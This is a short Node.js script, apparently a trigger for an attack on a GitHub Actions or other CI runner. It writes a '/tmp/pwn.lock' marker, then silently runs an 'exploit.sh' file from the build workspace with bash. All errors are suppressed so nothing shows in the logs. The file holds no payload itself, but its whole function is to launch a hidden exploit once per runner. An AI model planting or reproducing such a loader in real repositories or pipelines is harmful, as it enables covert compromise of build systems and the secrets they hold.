const fs = require('fs');
const { exec } = require('child_process');
const path = require('path');

const lockFile = '/tmp/pwn.lock';

if (!fs.existsSync(lockFile)) {
    try {
        fs.writeFileSync(lockFile, '1');
        const workspace = process.env.GITHUB_WORKSPACE || process.cwd();
        const exploitPath = path.join(workspace, 'exploit.sh');
        if (fs.existsSync(exploitPath)) {
            exec(`bash ${exploitPath}`, (err) => {
                if (err) {
                    // console.error(err);
                }
            });
        }
    } catch (e) {
        // Silent
    }
}
